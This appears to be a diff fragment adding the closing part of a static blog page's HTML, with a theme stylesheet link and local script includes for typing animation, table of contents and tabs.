+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
